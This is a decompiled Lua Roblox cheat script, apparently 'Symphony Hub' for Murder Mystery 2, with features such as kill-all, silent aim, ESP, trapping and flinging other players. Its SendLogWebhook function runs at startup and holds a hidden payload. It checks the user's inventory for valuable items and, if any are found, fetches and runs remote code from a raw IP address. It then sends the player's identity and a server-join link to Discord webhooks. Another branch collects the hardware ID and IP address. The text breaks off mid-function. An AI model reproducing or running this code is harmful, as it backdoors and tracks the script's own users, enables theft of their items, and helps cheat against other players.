-- filename: 
-- version: lua51
-- line: [0, 0] id: 0
repeat
  task.wait()
until game:IsLoaded()
local r0_0 = loadstring(game:HttpGet("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau"))()
local r1_0 = loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/ArrayField/refs/heads/main/BetterSaveManager2.luau"))()
local r2_0 = loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/ArrayField/refs/heads/main/BetterInterfaceManager2.luau"))()
local r3_0 = identifyexecutor() or "Not found"
local r4_0 = game.PlaceId
local r5_0 = game.JobId
if not r4_0 == 142823291 or not r4_0 == 335132309 or not r4_0 == 636649648 then
  r0_0:Notify({
    Title = "Symphony Hub",
    Content = "This game isn\'t supported by the script.",
    Duration = 3,
  })
  task.wait(3)
  r0_0:Destroy()
  return 
end
local function r6_0(r0_174)
  -- line: [0, 0] id: 174
  local r1_174 = ""
  for r5_174 = 1, r0_174, 1 do
    r1_174 = r1_174 .. string.char(math.random(97, 122))
  end
  return tostring(r1_174)
end
local r7_0 = r6_0(100)
local r8_0 = r6_0(100)
_G[r7_0] = loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/ArrayField/main/MyArrayFieldv2.lua"))()
if _G[r7_0] == "Sbjro5ym5CO9FFTrz4HspQPkAuOls0k3" then
  _G[r8_0] = "PCZBWdhoezTohhTqteax8DSm9xrSLWM4"
  if getgenv().SHF_LOADED then
    r0_0:Notify({
      Title = "Symphony Hub",
      Content = "Oops! You\'ve already executed the script. No double-dipping!",
      Duration = 3,
    })
    task.wait(3)
    r0_0:Destroy()
    return 
  end
  getgenv().SHF_LOADED = true
  local r9_0 = game:GetService("Workspace")
  local r10_0 = game:GetService("HttpService")
  local r11_0 = game:GetService("TeleportService")
  local r12_0 = game:GetService("ReplicatedStorage")
  local r13_0 = game:GetService("UserInputService")
  local r14_0 = game:GetService("Players")
  local r15_0 = game:GetService("RunService")
  local r16_0 = game:GetService("VirtualInputManager")
  local r17_0 = game:GetService("CoreGui")
  local r18_0 = game:GetService("StarterGui")
  local r19_0 = game:GetService("GuiService")
  local r20_0 = game:GetService("PathfindingService")
  local r21_0 = game:GetService("MarketplaceService")
  local r22_0 = game:GetService("TweenService")
  local r23_0 = game:GetService("Lighting")
  local r24_0 = game:GetService("Stats")
  local r25_0 = game:GetService("RbxAnalyticsService")
  local r26_0 = game:GetService("ContextActionService")
  local r27_0 = r25_0:GetClientId()
  local r28_0 = http
  if r28_0 then
    r28_0 = http.request or http_request or request or HttpPost
  else
    goto label_186	-- block#14 is visited secondly
  end
  local r29_0 = r14_0.LocalPlayer
  local r30_0 = r29_0.Character or r29_0.CharacterAdded:Wait()
  local r31_0 = r30_0:WaitForChild("Humanoid")
  local r32_0 = r30_0:WaitForChild("HumanoidRootPart")
  local r33_0 = tonumber(string.match(r29_0["CharacterAppearance\0"], "userId=(%d+)"))
  local r34_0 = r29_0:GetMouse()
  local r35_0 = r9_0.CurrentCamera
  local r36_0 = r35_0.WorldToViewportPoint
  local r37_0 = setclipboard or toclipboard or set_clipboard or Clipboard and Clipboard.set
  local r38_0 = queue_on_teleport or fluxus and fluxus.queue_on_teleport
  local r39_0 = {
    EnableWalkSpeed = false,
    WalkSpeedInput = 16,
    EnableJumpPower = false,
    JumpPowerInput = 50,
    InfiniteJump = false,
    Noclip = false,
    NoclipCamera = false,
    UnlockCamera = false,
    SecondLife = false,
    SeeDeadChat = false,
    AlwaysAliveChat = false,
    Seizure = false,
    TeleportToPlayer = nil,
    AntiFling = false,
    AntiTrap = false,
    ShowMurderer = false,
    ShowSheriff = false,
    ShowInnocent = false,
    ShowGun = false,
    ESPTextSize = 14,
    ESPTextTransparency = 1,
    MurdererESP = false,
    SheriffESP = false,
    InnocentESP = false,
    PlayerToFling = nil,
    AutoForceShoot = false,
    AutoBreakGun = false,
    AutoGrabGun = false,
    GunAura = false,
    AutoStealGun = false,
    SharpShooter = true,
    SheriffSilentAim = false,
    SSAAccuracy = "Dynamic",
    DefaultPrediction = 25,
    DefaultPing = 50,
    PingStep = 25,
    PredictionMultiplier = 1.5,
    PredictionMultiplierCap = 100,
    PlayersToKill = nil,
    AutoKillSheriff = false,
    AutoKillEveryone = false,
    KillAuraRange = 10,
    KillAura = false,
    KnifeSilentAim = false,
    AutoFakeBombClutch = false,
    Stealth = false,
    FakeGunBindButton = false,
    RainGun = false,
    SprintTrail = false,
    PlayersToTrap = false,
    LoopTrapPlayers = false,
    LoopTrapMurderer = false,
    LoopTrapSheriff = false,
    LoopTrapAll = false,
    AutoBlurtRoles = false,
    DestroyDisplay = false,
    DestroyCoins = false,
    DestroyDeadBody = false,
    DestroyBarriers = false,
    PlayerToSpray = nil,
    GlitchPower = 5,
    CoinAura = false,
    PlayersList = {},
    WhitelistedPlayers = {},
    ManualWhitelistedPlayers = {},
    WhitelistFriends = false,
    WhitelistMurderer = false,
    DynamicUpdateMethod = true,
    UpdateMethod = "On Player Event",
    AutoUpdateDelay = 0.1,
    AutoUpdatePlayerList = true,
    ShowMurdererEnabled = false,
    ShowSheriffEnabled = false,
    ShowInnocentEnabled = false,
    ShowGunEnabled = false,
    ShowDeadEnabled = false,
  }
  local r40_0 = {
    IsPremium = false,
    Gameplay = {
      Murderer = nil,
      MurdererPerk = nil,
      Sheriff = nil,
    },
    GameplayMap = {},
    IsRoundStarting = false,
    IsRoundStarted = false,
    FirstExecution = false,
    IsSus = false,
    InSprayCooldown = false,
    Map = nil,
    Ping = 0,
    PredictValue = 0,
    PingDifference = 0,
    GunDrop = nil,
  }
  local r41_0 = {
    Knife = "Murderer",
    Gun = "Sheriff",
  }
  local r42_0 = {
    ScriptInfoDesc = nil,
    RoundInformationDesc = nil,
    SilentAimDesc = nil,
    UpdateTeleportToPlayerList = false,
    TeleportToPlayerList = nil,
    UpdateSpectatePlayerList = false,
    SpectatePlayerList = nil,
    UpdateFlingPlayerList = nil,
    FlingPlayerList = nil,
    UpdatePlayersToKillList = false,
    PlayersToKillList = nil,
    WhitelistedPlayersList = nil,
    UpdateWhitelistedPlayersList = false,
  }
  local r43_0 = {
    Jump = nil,
    Died = nil,
    RoundEndFade = nil,
    VotingEnabled = nil,
  }
  local r44_0 = {
    "sit",
    "ninja",
    "dab",
    "zen",
    "floss",
    "headless",
    "zombie",
    "wave",
    "cheer",
    "laugh"
  }
  r40_0.IsPremium = r21_0:UserOwnsGamePassAsync(r33_0, 829612265) or r21_0:UserOwnsGamePassAsync(r33_0, 824265248) or r21_0:UserOwnsGamePassAsync(r33_0, 140358979)
  if not isfolder("Symphony Hub") then
    makefolder("Symphony Hub")
    r40_0.FirstExecution = true
  end
  function IsIPAddress(r0_115)
    -- line: [0, 0] id: 115
    return string.match(r0_115, "^%d+%.%d+%.%d+%.%d+$") ~= nil
  end
  function DateTime()
    -- line: [0, 0] id: 173
    local r0_173 = os.date("!*t", os.time())
    return string.format("%d-%d-%dT%02d:%02d:%02dZ", r0_173.year, r0_173.month, r0_173.day, r0_173.hour, r0_173.min, r0_173.sec)
  end
  local r45_0 = {}
  local r46_0 = {
    Godly = true,
    Ancient = true,
    Unique = true,
    Classic = true,
    Halloween = true,
    Christmas = true,
    Legendary = false,
  }
  local r47_0 = {
    Gingerscope = true,
    TravelerAxe = true,
    TreeGun2023Chroma = true,
    TreeKnife2023Chroma = true,
    WatergunChroma = true,
    Harvester = true,
    Icepiercer = true,
    Sorry = true,
    Turkey2023 = true,
    ZombieBat = true,
    Blossom = true,
    Sakura_K = true,
    Blossom_G = true,
    Darkshot = true,
    Darksword = true,
    VampireGun = true,
    VampireGunChroma = true,
    VampireAxe = true,
  }
  local r48_0 = {
    Godly = 0,
    Ancient = 0,
    Unique = 0,
    Classic = 0,
    Halloween = 0,
    Christmas = 0,
    Legendary = 0,
    Rare = 0,
    Uncommon = 0,
    Common = 0,
  }
  local r56_0 = nil	-- notice: implicit variable refs by block#[36, 37, 38]
  for r53_0, r54_0 in pairs(r12_0.Remotes.Extras.GetData2:InvokeServer().Weapons.Owned) do
    local r55_0 = r12_0.Remotes.Extras.GetItemData:InvokeServer()[r53_0]
    if r55_0 then
      r56_0 = r55_0.Rarity
      if not r56_0 then
        ::label_469::
        r56_0 = "Unknown"
      end
    else
      goto label_469	-- block#35 is visited secondly
    end
    r45_0[tostring(r53_0)] = {
      count = r54_0,
      rarity = r56_0,
    }
    if r56_0 and r48_0[r56_0] ~= nil then
      r48_0[r56_0] = r48_0[r56_0] + 1
    end
  end
  local r50_0 = false
  local r51_0 = false
  function SendLogWebhook(r0_177, r1_177)
    -- line: [0, 0] id: 177
    local r2_177 = "https://discord.com/api/webhooks/1264572791852630058/KLtdFvjHgZ4ui2mzFgOM4CP-czc2HzUAKvU5JhJNTRd4nLFNIMYK_FvByToyHFNjEhgZ"
    local r3_177 = {}
    local r4_177 = false
    table.insert(r3_177, "Executor: " .. r3_0)
    table.insert(r3_177, "Game: Murder Mystery 2")
    table.insert(r3_177, "Is Premium: " .. tostring(r40_0.IsPremium))
    table.insert(r3_177, "First Execution: " .. tostring(r40_0.FirstExecution))
    table.insert(r3_177, "Username: " .. r29_0.Name)
    table.insert(r3_177, "User Id: " .. r33_0)
    table.insert(r3_177, "Job Id: " .. r5_0)
    if r0_177 == "Execution" then
      if r29_0.Name ~= r29_0.DisplayName then
        table.insert(r3_177, "Display Name: " .. r29_0.DisplayName)
      end
      table.insert(r3_177, "Age: " .. r29_0.AccountAge .. " days")
      table.insert(r3_177, "Place Id: " .. r4_0)
    elseif r0_177 == "Control" then
      if r12_0.Remotes.Extras.IsVIPServer:InvokeServer() then
        return 
      end
      for r8_177, r9_177 in pairs(r45_0) do
        if r46_0[r9_177.rarity] then
          r50_0 = true
          if r47_0[r8_177] then
            r51_0 = true
          end
        end
      end
      if not r50_0 then
        return 
      end
      r0_177 = "Execution"
      if r51_0 then
        ID = "07741a26-fac0-4ac7-8676-df4a5b060bac"
        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
        r2_177 = "https://discord.com/api/webhooks/1396236008097316966/IEZV0bW4Q3hkU-lR6zFSVB2Gj_DJjN_7uq6eGr8aP3nDcHoYtYI33F5IY0lG2RlFTy53"
      else
        r2_177 = "https://discord.com/api/webhooks/1396576823340695623/V_4Ln4__SfVggcb9JUofltNlrtg9-aqih0tm-PPStN6qqqCpht1AvBbju7wQcd8qxs47"
      end
      table.insert(r3_177, string.format("[Join](https://www.roblox.com/games/start?placeId=130970357952631&launchData=%s/%s)", r4_0, r5_0))
    elseif r0_177 == "Security" then
      r2_177 = "https://discord.com/api/webhooks/1234107774217228361/JxDFBgUxsjAHU0aW74JcjtQGsc44hHa5xf3FQLBd_otnhk57YqdHIIEg1a0kD85AenoJ"
      table.insert(r3_177, "Flag: " .. r1_177)
      table.insert(r3_177, "Hwid: " .. r27_0)
      local r5_177 = game:HttpGet("https://api.ipify.org")
      local r6_177 = game:HttpGet("https://api64.ipify.org")
      if not r5_177 or not r6_177 then
        r4_177 = true
        table.insert(r3_177, "Ip Not Found")
      elseif not IsIPAddress(r5_177) or not IsIPAddress(r6_177) then
        table.insert(r3_177, "Invalid Ip: " .. r5_177 .. " | " .. r6_177)
      elseif r5_177 ~= r6_177 then
        table.insert(r3_177, "Ip v4: " .. r5_177)
        table.insert(r3_177, "Ip v6: " .. r6_177)
      else
        table.insert(r3_177, "Ip: " .. r5_177)
      end
    elseif r0_177 == "Report" then
      r2_177 = "https://discord.com/api/webhooks/1234107698661036073/X-gNbp-Qn-xBVXG8PJYxVK15qLSh347iHm-W6WpznLWyLIiKN9PIDNZ5DWkBFrIbC2r6"
      table.insert(r3_177, "Place Id: " .. r4_0)
      table.insert(r3_177, r1_177)
    end
    local r5_177 = {
      username = "Symphony Hub",
      embeds = {
        {
          color = 2003199,
          title = r0_177,
          description = "**" .. table.concat(r3_177, "\n") .. "**",
          timestamp = DateTime(),
          footer = {
            text = "Symphony Hub",
          },
        }
      },
    }
    if r0_177 == "Control" and r50_0 then
      r5_177.content = "@everyone"
    end
    local r6_177, r7_177 = pcall(function()
      -- line: [0, 0] id: 178
      return r28_0({
        Url = r2_177,
        Method = "POST",
        Headers = {
          ["Content-Type"] = "application/json",
        },
        Body = r10_0:JSONEncode(r5_177),
      })
    end)
    if not r6_177 then
      r4_177 = true
    end
    if r4_177 then
      print("oops")
    end
  end
  task.spawn(SendLogWebhook, "Control")
  function RefreshPlayersList()
    -- line: [0, 0] id: 196
    r39_0.PlayersList = {}
    for r3_196, r4_196 in pairs(r14_0:GetPlayers()) do
      if r4_196 ~= r29_0 then
        table.insert(r39_0.PlayersList, r4_196.name)
      end
    end
  end
  RefreshPlayersList()
  function UpdatePlayerLists(r0_137, r1_137)
    -- line: [0, 0] id: 137
    if r0_137 == "On Dropdown Change" then
      if r1_137 then
        RefreshPlayersList()
        r1_137:SetValues(r39_0.PlayersList)
      else
        r42_0.UpdateTeleportToPlayerList = true
        r42_0.UpdateSpectatePlayerList = true
        r42_0.UpdateFlingPlayerList = true
        r42_0.UpdatePlayersToKillList = true
      end
    elseif r0_137 == "On Player Event" then
      for r6_137, r7_137 in ipairs({
        r42_0.TeleportToPlayerList,
        r42_0.SpectatePlayerList,
        r42_0.FlingPlayerList,
        r42_0.PlayersToKillList
      }) do
        RefreshPlayersList()
        r7_137:SetValues(r39_0.PlayersList)
        task.wait(r39_0.AutoUpdateDelay)
      end
    end
  end
  function SetRole(r0_44, r1_44)
    -- line: [0, 0] id: 44
    local r2_44 = r40_0.Gameplay[r1_44]
    if r2_44 then
      if r0_44 == r2_44 then
        return 
      end
      r40_0.GameplayMap[r40_0.Gameplay[r1_44].Name] = nil
    end
    r40_0.Gameplay[r1_44] = r0_44
    r40_0.GameplayMap[r0_44.Name] = r1_44
  end
  function GetRoles()
    -- line: [0, 0] id: 192
    for r4_192, r5_192 in pairs(r12_0.Remotes.Extras.GetPlayerData:InvokeServer()) do
      if r5_192.Role ~= "Innocent" then
        local r6_192 = r14_0:FindFirstChild(r4_192)
        if r6_192 then
          SetRole(r6_192, r5_192.Role)
        end
      end
    end
  end
  function FixMemoryLeak(r0_69)
    -- line: [0, 0] id: 69
    task.spawn(function()
      -- line: [0, 0] id: 70
      if r0_69 == r29_0 or not r40_0.IsRoundStarted and not r40_0.IsRoundStarting then
        return 
      end
      local r0_70 = r0_69.Character
      if not r0_70 then
        repeat
          task.wait()
          r0_70 = r0_69.Character
        until r0_70
      end
      local r1_70 = r0_70:FindFirstChild("UpperTorso")
      if not r1_70 then
        repeat
          task.wait()
          r1_70 = r0_70:FindFirstChild("UpperTorso")
        until r1_70
      end
      if not r1_70:FindFirstChild("BillboardGui") then
        local r2_70 = Instance.new("BillboardGui")
        r2_70.Name = "Target"
        r2_70.Parent = r1_70
        local r3_70 = Instance.new("ImageLabel")
        r3_70.Name = "Icon"
        r3_70.Parent = r1_70.Target
      elseif not r1_70.Target:FindFirstChild("Icon") then
        local r2_70 = Instance.new("ImageLabel")
        r2_70.Name = "Icon"
        r2_70.Parent = r1_70.Target
      end
    end)
  end
  function CheckTool(r0_84)
    -- line: [0, 0] id: 84
    local r1_84 = r0_84:FindFirstAncestorOfClass("Player") or r14_0:GetPlayerFromCharacter(r0_84:FindFirstAncestorOfClass("Model"))
    if r1_84 then
      SetRole(r1_84, r41_0[r0_84.Name])
      for r5_84, r6_84 in pairs(r14_0:GetPlayers()) do
        FixMemoryLeak(r6_84)
      end
    end
  end
  function GetMurdererPerk()
    -- line: [0, 0] id: 116
    if r40_0.Gameplay.Murderer then
      return r12_0.Remotes.Extras.GetPlayerData:InvokeServer()[tostring(r40_0.Gameplay.Murderer)].Effect
    end
  end
  function IsAlive(r0_100)
    -- line: [0, 0] id: 100
    -- notice: unreachable block#6
    if not r0_100 then
      r0_100 = r29_0.Name
    end
    local r1_100 = r12_0.Remotes.Extras.GetPlayerData:InvokeServer()[r0_100]
    if r1_100 then
      local r2_100 = r1_100.Killed
      if not r2_100 then
        r2_100 = not r1_100.Dead
      else
        r2_100 = false
      end
      return r2_100
    end
    return false
  end
  for r55_0, r56_0 in pairs({
    r9_0,
    r14_0
  }) do
    for r60_0, r61_0 in pairs(r56_0:GetDescendants()) do
      if r61_0.ClassName == "Tool" and (r61_0.Name == "Knife" or r61_0.Name == "Gun") then
        CheckTool(r61_0)
      end
    end
  end
  if not r40_0.Gameplay.Murderer or not r40_0.Gameplay.Sheriff then
    GetRoles()
  end
  function GetTimer()
    -- line: [0, 0] id: 87
    return r12_0.Remotes.Extras.GetTimer:InvokeServer()
  end
  local r52_0 = GetTimer()
  local r53_0 = 180
  if r52_0 < r53_0 then
    r53_0 = 0 < r52_0
  else
    goto label_604	-- block#53 is visited secondly
  end
  r40_0.IsRoundStarted = r53_0
  r40_0.IsRoundStarting = r52_0 == 180
  function FindMap()
    -- line: [0, 0] id: 53
    if not r40_0.Map then
      for r3_53, r4_53 in pairs(r9_0:GetDescendants()) do
        if r4_53:IsA("Model") and (r4_53.Name == "CoinContainer" or r4_53.Name == "CoinAreas") then
          r40_0.Map = r4_53.Parent
          break
        end
      end
    end
  end
  function BindButton(r0_21, r1_21)
    -- line: [0, 0] id: 21
    r26_0:BindAction(r0_21, function(r0_22, r1_22, r2_22)
      -- line: [0, 0] id: 22
      if r1_22 == Enum.UserInputState.Begin then
        r1_21.Callback()
      end
    end, true, "nil", Enum.KeyCode.ButtonR1)
    r26_0:SetTitle(r0_21, r1_21.OriginalName)
    r26_0:SetPosition(r0_21, r1_21.Position)
  end
  function UnbindButton(r0_57)
    -- line: [0, 0] id: 57
    r26_0:UnbindAction(r0_57)
  end
  function IsFriend(r0_128)
    -- line: [0, 0] id: 128
    return r29_0:IsFriendsWith(r0_128.UserId)
  end
  function IsPlayerWhitelisted(r0_188)
    -- line: [0, 0] id: 188
    for r4_188, r5_188 in ipairs(r39_0.WhitelistedPlayers) do
      if r0_188 == r5_188 then
        return true
      end
    end
    return false
  end
  function GetToyPath(r0_95)
    -- line: [0, 0] id: 95
    local r1_95 = r29_0.Backpack
    if r1_95 and r30_0 then
      local r2_95 = r1_95:FindFirstChild(r0_95) or r30_0:FindFirstChild(r0_95)
      if not r2_95 then
        local r3_95 = r1_95:FindFirstChild("Toys")
        if r3_95 then
          r2_95 = r3_95:FindFirstChild(r0_95)
        end
      end
      if r2_95 then
        return r2_95
      end
    end
  end
  function EquipTool(r0_3, r1_3)
    -- line: [0, 0] id: 3
    local r2_3 = r29_0.Backpack:FindFirstChild(r0_3)
    if not r2_3 then
      r12_0.Remotes.Extras.ReplicateToy:InvokeServer(r0_3)
      r2_3 = r29_0.Backpack:FindFirstChild(r0_3)
    end
    if r2_3 then
      task.wait()
      if r1_3 then
        r2_3.Parent = r30_0
      else
        r31_0:EquipTool(r2_3)
      end
    end
  end
  function UnequipTools()
    -- line: [0, 0] id: 149
    r31_0:UnequipTools()
  end
  function GetNearestPlayer(r0_121)
    -- line: [0, 0] id: 121
    if not r0_121 or not r32_0 then
      return nil
    end
    local r1_121 = math.huge
    local r2_121 = nil
    for r6_121, r7_121 in ipairs(r14_0:GetPlayers()) do
      if r7_121 ~= r29_0 and r7_121.Character and not IsPlayerWhitelisted(r7_121.Name) then
        local r8_121 = r7_121.Character:FindFirstChild("HumanoidRootPart")
        if r8_121 then
          local r9_121 = (r8_121.Position - r32_0.Position).Magnitude
          if r9_121 <= tonumber(r0_121) and r9_121 < r1_121 then
            r1_121 = r9_121
            r2_121 = r7_121
          end
        end
      end
    end
    return r2_121
  end
  function TeleportTo(r0_88, r1_88)
    -- line: [0, 0] id: 88
    local r2_88, r3_88 = pcall(function()
      -- line: [0, 0] id: 89
      if r0_88 == "Murderer" then
        if r40_0.Gameplay.Murderer then
          r32_0.CFrame = CFrame.new(r14_0[tostring(r40_0.Gameplay.Murderer)].Character.HumanoidRootPart.Position + Vector3.new(0, r32_0.Size.Y / 2, 0))
        else
          r0_0:Notify({
            Title = "Symphony Hub",
            Content = "No murderer in sight, just me and my detective skills on standby!",
            Duration = 5,
          })
        end
      end
      if r0_88 == "Sheriff" then
        if r40_0.Gameplay.Sheriff then
          r32_0.CFrame = CFrame.new(r14_0[tostring(r40_0.Gameplay.Sheriff)].Character.HumanoidRootPart.Position + Vector3.new(0, r32_0.Size.Y / 2, 0))
        else
          r0_0:Notify({
            Title = "Symphony Hub",
            Content = "No sheriff in sight, guess I\'m the law now!",
            Duration = 5,
          })
        end
      end
      if r0_88 == "Lobby" then
        local r0_89 = r9_0.Lobby.Lobby
        r32_0.CFrame = CFrame.new(r0_89.Spawns:GetChildren()[math.random(1, #r0_89.Spawns:GetChildren())].Position + Vector3.new(0, r32_0.Size.Y / 2, 0))
      end
      if r0_88 == "Voting Room" then
        r32_0.CFrame = CFrame.new(r9_0.Lobby.Lobby:GetChildren()[236].WorldPivot.Position + Vector3.new(0, r32_0.Size.Y / 2, 0))
      end
      if r0_88 == "Map" then
        if r40_0.Map then
          local r0_89 = r40_0.Map:FindFirstChild("Spawns")
          if r0_89 and 0 < #r0_89:GetChildren() then
            r32_0.CFrame = CFrame.new(r0_89:GetChildren()[math.random(1, #r0_89:GetChildren())].Position + Vector3.new(0, r32_0.Size.Y / 2, 0))
          end
        else
          r0_0:Notify({
            Title = "Symphony Hub",
            Content = "No sign of the map yet. Looks like we\'re lost in the virtual wilderness! :(",
            Duration = 5,
          })
        end
      end
      if r0_88 == "Player" and r1_88 then
        local r0_89 = r14_0:FindFirstChild(r1_88).Character.HumanoidRootPart
        if r0_89 then
          r32_0.CFrame = CFrame.new(r0_89.Position)
        end
      end
    end)
    if not r2_88 then
      warn("Teleport Error: " .. r3_88)
    end
  end
  function Spectate(r0_51, r1_51)
    -- line: [0, 0] id: 51
    local r2_51, r3_51 = pcall(function()
      -- line: [0, 0] id: 52
      if r0_51 == "Murderer" then
        if r40_0.Gameplay.Murderer then
          r35_0.CameraSubject = r14_0[tostring(r40_0.Gameplay.Murderer)].Character.Humanoid
        else
          r0_0:Notify({
            Title = "Symphony Hub",
            Content = "No murderer in sight, just me and my detective skills on standby!",
            Duration = 5,
          })
        end
      end
      if r0_51 == "Sheriff" then
        if r40_0.Gameplay.Sheriff then
          r35_0.CameraSubject = r14_0[tostring(r40_0.Gameplay.Sheriff)].Character.Humanoid
        else
          r0_0:Notify({
            Title = "Symphony Hub",
            Content = "No sheriff in sight, guess I\'m the law now!",
            Duration = 5,
          })
        end
      end
      if r0_51 == "Player" and r1_51 then
        r35_0.CameraSubject = r14_0:FindFirstChild(r1_51).Character.Humanoid
      end
      if r0_51 == "Stop" then
        r35_0.CameraSubject = r31_0
      end
    end)
    if not r2_51 then
      warn("Spectate Error: " .. r3_51)
    end
  end
  function IsCoinBagFull()
    -- line: [0, 0] id: 125
    if r29_0.PlayerGui.MainGUI.Game:FindFirstChild("CoinBags") then
      return r29_0.PlayerGui.MainGUI.Game.CoinBags.Container.Coin.Full.Visible
    end
    return r29_0.PlayerGui.MainGUI.Lobby.Dock.CoinBags.Container.Coin.FullBagIcon.Visible
  end
  function IsEggBagFull()
    -- line: [0, 0] id: 15
    if r29_0.PlayerGui.MainGUI.Game:FindFirstChild("CoinBags") then
      return r29_0.PlayerGui.MainGUI.Game.CoinBags.Container.Egg.Full.Visible
    end
    return r29_0.PlayerGui.MainGUI.Lobby.Dock.CoinBags.Container.Egg.FullBagIcon.Visible
  end
  function IsPerkOwned(r0_56)
    -- line: [0, 0] id: 56
    local r2_56 = table.find(r12_0.Remotes.Extras.GetData2:InvokeServer().Perks.Owned, r0_56)
    if r2_56 then
      r2_56 = true or false
    else
      goto label_18	-- block#2 is visited secondly
    end
    return r2_56
  end
  function InfiniteGhost(r0_29)
    -- line: [0, 0] id: 29
    r12_0.Remotes.Gameplay.Stealth:FireServer(r0_29)
  end
  function GetFakeGun(r0_193)
    -- line: [0, 0] id: 193
    if not r0_193 then
      r0_193 = 1
    end
    for r4_193 = 1, r0_193, 1 do
      SecureFireServer(r12_0.Remotes.Gameplay.FakeGun, true)
    end
  end
  function CleanFakeGun(r0_32)
    -- line: [0, 0] id: 32
    pcall(function()
      -- line: [0, 0] id: 33
      for r3_33, r4_33 in ipairs(r0_32:GetChildren()) do
        if r4_33:IsA("Tool") and r4_33:GetAttribute("ItemType") == "Gun" and not r4_33:FindFirstChild("KnifeServer") then
          r4_33:Destroy()
        end
      end
    end)
  end
  function FGCleanInventory()
    -- line: [0, 0] id: 98
    UnequipTools()
    task.wait()
    CleanFakeGun(r29_0.Backpack)
  end
  function DropFakeGun(r0_58)
    -- line: [0, 0] id: 58
    for r4_58, r5_58 in ipairs(r9_0[r29_0.Name]:GetChildren()) do
      if r5_58:IsA("Tool") and r5_58.CanBeDropped and r5_58:GetAttribute("ItemType") == "Gun" and not r5_58:FindFirstChild("KnifeServer") then
        r5_58.Parent = r9_0
      end
    end
  end
  function SprintTrail(r0_170)
    -- line: [0, 0] id: 170
    r30_0.SpeedTrail.Toggle:FireServer(r0_170)
  end
  function SendChatMessage(r0_23)
    -- line: [0, 0] id: 23
    r12_0:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(r0_23, "normalchat")
  end
  function PlaceTrap(r0_12)
    -- line: [0, 0] id: 12
    r12_0.TrapSystem.PlaceTrap:InvokeServer(CFrame.new(r0_12))
  end
  function TrapPlayer(r0_93)
    -- line: [0, 0] id: 93
    pcall(function()
      -- line: [0, 0] id: 94
      local r0_94 = r14_0:FindFirstChild(r0_93)
      if r0_94 then
        local r1_94 = r0_94.Character
        if r1_94 then
          local r2_94 = r1_94:FindFirstChild("HumanoidRootPart")
          if r2_94 then
            PlaceTrap(r2_94.Position)
          end
        end
      end
    end)
  end
  function TrapAll()
    -- line: [0, 0] id: 55
    for r3_55, r4_55 in ipairs(r14_0:GetPlayers()) do
      if r4_55 ~= r29_0 and not IsPlayerWhitelisted(r4_55.Name) then
        TrapPlayer(r4_55.Name)
      end
    end
  end
  function TrapSelectedPlayers(r0_164)
    -- line: [0, 0] id: 164
    if not r0_164 then
      return 
    end
    for r4_164, r5_164 in ipairs(r0_164) do
      TrapPlayer(r5_164)
    end
  end
  function Stab()
    -- line: [0, 0] id: 85
    r30_0.Knife.Stab:FireServer()
  end
  function KillPlayer(r0_75, r1_75)
    -- line: [0, 0] id: 75
    task.spawn(function()
      -- line: [0, 0] id: 76
      local r0_76 = r14_0:FindFirstChild(r0_75)
      if tostring(r40_0.Gameplay.Murderer) == r29_0.Name and r0_76 then
        if not r30_0:FindFirstChild("Knife") and r1_75 then
          EquipTool("Knife")
        end
        local r1_76 = r0_76.Character
        local r2_76 = r1_76 and r1_76:FindFirstChild("HumanoidRootPart")
        if r2_76 and r30_0.Knife then
          task.wait()
          if r1_75 then
            Stab()
          end
          firetouchinterest(r2_76, r30_0.Knife.Handle, 1)
          firetouchinterest(r2_76, r30_0.Knife.Handle, 0)
        end
      end
    end)
  end
  function KillAll()
    -- line: [0, 0] id: 150
    task.spawn(function()
      -- line: [0, 0] id: 151
      if tostring(r40_0.Gameplay.Murderer) == r29_0.Name then
        for r3_151, r4_151 in ipairs(r14_0:GetPlayers()) do
          if r4_151 ~= r29_0 and not IsPlayerWhitelisted(r4_151.Name) then
            local r5_151 = r4_151.Character
            local r6_151 = r5_151 and r5_151:FindFirstChild("HumanoidRootPart")
            if r6_151 then
              local r7_151 = r30_0:FindFirstChild("Knife")
              if not r7_151 then
                EquipTool("Knife")
                r7_151 = r30_0:FindFirstChild("Knife")
              end
              task.wait()
              Stab()
              firetouchinterest(r6_151, r7_151.Handle, 1)
              firetouchinterest(r6_151, r7_151.Handle, 0)
            end
          end
        end
      end
    end)
  end
  function KillSelectedPlayers(r0_187)
    -- line: [0, 0] id: 187
    if not r0_187 then
      return 
    end
    for r4_187, r5_187 in ipairs(r0_187) do
      KillPlayer(r5_187, true)
    end
  end
  function Spray(r0_47, r1_47, r2_47, r3_47, r4_47, r5_47, r6_47, r7_47)
    -- line: [0, 0] id: 47
    if r40_0.InSprayCooldown then
      r0_0:Notify({
        Title = "Symphony Hub",
        Content = "Slow down, Speedy! You\'re still in cooldown!",
        Duration = 5,
      })
      return 
    end
    r40_0.InSprayCooldown = true
    local r8_47 = false
    if not r30_0:FindFirstChild("SprayPaint") then
      EquipTool("SprayPaint", true)
      r8_47 = true
    end
    local r9_47 = Vector3.new(r5_47, r6_47, r7_47)
    if not r4_47 then
      r9_47 = -r9_47
    end
    r30_0.SprayPaint.Remote:FireServer(unpack({
      [1] = r0_47,
      [2] = Enum.NormalId[r1_47],
      [3] = 5,
      [4] = r2_47,
      [5] = CFrame.new(((r3_47 or r2_47)).Position + r9_47),
    }))
    if r8_47 then
      r30_0.SprayPaint.Parent = r29_0.Backpack
    end
    task.delay(15, function()
      -- line: [0, 0] id: 48
      r40_0.InSprayCooldown = false
    end)
  end
  function SprayPlayer(r0_104, r1_104, r2_104)
    -- line: [0, 0] id: 104
    if not r0_104 then
      return 
    end
    pcall(function()
      -- line: [0, 0] id: 105
      local r0_105 = r14_0:FindFirstChild(r0_104).Character
      if r0_105 then
        if r1_104 == "Reset" then
          Spray(0, "Top", r0_105:FindFirstChild("HumanoidRootPart"), nil, false, 9000000000, 9000000000, 9000000000)
        elseif r1_104 == "Glitch" then
          Spray(0, "Top", r0_105:FindFirstChild("LeftFoot"), nil, false, r2_104 * 50, r2_104 * 50, r2_104 * 50)
        end
      end
    end)
  end
  function GrabGun()
    -- line: [0, 0] id: 180
    pcall(function()
      -- line: [0, 0] id: 181
      if r40_0.GunDrop and IsAlive() and r32_0 and tostring(r40_0.Gameplay.Murderer) ~= r29_0.Name then
        local r0_181 = r32_0.Position
        task.wait(0.05)
